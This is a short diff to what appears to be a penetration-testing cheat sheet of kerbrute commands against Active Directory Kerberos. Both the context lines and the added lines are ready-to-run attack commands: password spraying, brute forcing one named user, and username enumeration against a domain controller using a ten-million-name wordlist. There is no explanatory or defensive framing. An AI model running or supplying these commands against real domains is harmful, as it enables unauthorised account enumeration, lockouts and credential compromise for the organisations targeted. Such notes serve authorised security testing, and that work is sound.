@@ -4,3 +4,6 @@ kerbrute passwordspray --user-as-pass --domain "$DOMAIN" domain_users.txt
 kerbrute bruteuser --domain "$DOMAIN" passwords.lst thoffman
 kerbrute bruteforce --domain "$DOMAIN" user_password.lst
 kerbrute userenum --domain "$DOMAIN" usernames.txt --dc "$DC_IP"
+kerbrute userenum -d "$DOMAIN" --dc "$IP" "$USERLIST"
+kerbrute userenum -d "$DOMAIN" /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc "$IP"
+kerbrute passwordspray -d "$DOMAIN" --dc "$IP" valid_users.txt "$PASSWORD"
